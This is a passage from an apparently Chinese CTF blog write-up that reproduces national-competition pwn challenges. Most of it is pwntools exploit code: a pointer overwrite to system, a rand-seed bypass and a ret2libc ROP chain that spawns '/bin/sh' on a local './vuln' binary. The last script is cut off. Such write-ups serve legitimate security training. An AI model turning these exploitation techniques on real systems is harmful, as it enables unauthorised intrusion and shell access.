punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'challen'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Good luck!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'22'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>strlen_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'strlen'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>strlen_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'index>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># gdb.debug()</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>paylaod <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x88\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># io.recvuntil(b'bye~\\n')</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># payload1 = b'\\xe0\\xef'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x31\\x0a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">b'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x78\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># io.send(b'a')</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"åä¸œèµ›åŒº\"><a class=\"markdownIt-Anchor\" href=\"#åä¸œèµ›åŒº\">#</a> åä¸œèµ›åŒºï¼š</h3>\n<h5 id=\"æ£€æŸ¥ç¨‹åº-2\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥ç¨‹åº-2\">#</a> æ£€æŸ¥ç¨‹åºï¼š</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171805702.png\" alt=\"image-20230722171805702\"></p>\n<h5 id=\"æ‰§è¡Œç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#æ‰§è¡Œç¨‹åº\">#</a> æ‰§è¡Œç¨‹åºï¼š</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171849970.png\" alt=\"image-20230722171849970\"></p>\n<h5 id=\"æ”¾å…¥ida-2\"><a class=\"markdownIt-Anchor\" href=\"#æ”¾å…¥ida-2\">#</a> æ”¾å…¥ IDAï¼š</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172024544.png\" alt=\"image-20230722172024544\"></p>\n<h5 id=\"å‘ç°æ¼æ´å‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#å‘ç°æ¼æ´å‡½æ•°\">#</a> å‘ç°æ¼æ´å‡½æ•°ï¼š</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172050505.png\" alt=\"image-20230722172050505\"></p>\n<p>æ•´ä½“æ€è·¯ï¼Œç»•è¿‡éšæœºæ•°æ£€æŸ¥åˆ¤æ–­ï¼Œåˆ°è¾¾æ¼æ´å‡½æ•°ï¼Œè·å– shellã€‚seed ç§å­æ˜¯ 4 å­—èŠ‚å¤§å°è¦æ³¨æ„</p>\n<h5 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp:</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00401443</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x040125D</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># v6 = (libc.rand(b)-1) %100 +2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># p.sendafter(b'number:\\n',p32(v6))</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.27.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘æœ¬åœ°çš„ libc ä¸‹è½½æ¥ï¼Œè¿˜æ˜¯æ‰“ä¸é€šï¼ŒçœŸçš„ä¸çŸ¥é“å•Šå•Šå•Šå•Šå•Šå•Š</p>\n<p>èƒ½æ‰“é€šæœ¬åœ°çš„ exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x401443</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x40125D</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td 